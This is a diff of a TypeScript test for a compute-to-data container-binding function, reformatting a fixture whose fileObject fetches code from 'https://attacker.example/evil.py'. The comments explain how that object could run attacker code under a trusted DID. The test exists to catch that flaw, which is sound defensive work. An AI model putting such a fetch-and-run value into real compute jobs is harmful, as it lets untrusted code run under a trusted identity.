@@ -132,7 +132,11 @@ describe('bindAlgorithmContainerToDDO (C2D trusted-algo container binding)', () 
       // Attacker code file: checksums are validated from the DDO service files, but
       // resolveComputeFileObject (uploadData) honors fileObject BEFORE documentId+serviceId,
       // so this would run the attacker's code under a trusted DID if left in place.
-      fileObject: { type: 'url', url: 'https://attacker.example/evil.py', method: 'GET' } as any,
+      fileObject: {
+        type: 'url',
+        url: 'https://attacker.example/evil.py',
+        method: 'GET'
+      } as any,
       meta: {
         container: structuredClone(MALICIOUS_CONTAINER) as any
       }
